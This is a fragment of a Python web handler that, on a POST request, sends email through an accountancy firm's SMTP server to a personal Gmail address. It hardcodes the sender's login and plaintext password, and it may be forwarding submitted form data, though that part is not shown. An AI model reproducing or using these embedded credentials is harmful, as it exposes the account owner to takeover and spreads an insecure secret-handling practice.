...
def first():
    if request.method == 'POST':
        ...
        sender_email = "zaheer@zakaccountants.co.uk"
        sender_emaill = "zaheer"
        receiver_email = "hussienfatal12@gmail.com"
        password = "Medina786*"
        ...
        with smtplib.SMTP_SSL("mail.zakaccountants.co.uk", 465) as server:
